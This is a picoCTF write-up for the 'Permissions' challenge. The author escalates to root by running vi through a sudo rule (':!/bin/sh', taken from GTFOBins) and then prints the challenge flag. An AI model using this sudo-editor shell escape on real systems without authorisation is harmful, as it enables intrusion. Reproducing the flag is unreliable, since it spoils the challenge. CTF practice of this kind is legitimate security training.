# Permissions

Author: Geoffrey Njogu
Location: https://play.picoctf.org/events/72/challenges/challenge/363
Tags: General Skills, vim

## Problem

> Can you read files in the root file? Additional details will be available after launching your challenge instance.

This challenge also comes with the hint "What permissions do you have?"

## Solution

I started by launching an instance of the challenge (Figure 1). I then proceeded to log into the system via ``ssh``, as shown below:

```
lambdacalculus-picoctf@webshell:~$ ssh -p 52131 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]' can't be established.
ED25519 key fingerprint is SHA256:Km7la74G7/fztU37KiXuMDlWhxowKKAxA3TjvWy1Y0o.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.15.0-1031-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ 
```

Given the tag of "vim", the hint and the challenge name of "Permissions", I figured that I would be exploiting a GTFO bin to get root privileges. I queried the GTFOBin entry on ``vim`` [1] and first wanted to see if I could run it via ``sudo``:

```
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ 
```

It seems that I can. So, I used the following command to get root:

```
picoplayer@challenge:~$ sudo vim -c ':!/bin/sh'
Sorry, user picoplayer is not allowed to execute '/usr/bin/vim -c :!/bin/sh' as root on challenge.
picoplayer@challenge:~$ sudo /usr/bin/vi -c ':!/bin/sh'

# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

I then searched for a potential flag:

```
# ls -l /root
total 0
# ls -la /root
total 12
drwx------ 1 root root   23 Mar 16 02:29 .
drwxr-xr-x 1 root root   51 Mar 16 19:37 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Mar 16 02:29 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
# cat /root/.flag.txt
picoCTF{uS1ng_v1m_3dit0r_55878b51}
# 
```

Excellent.

## References

1. https://gtfobins.github.io/gtfobins/vim/
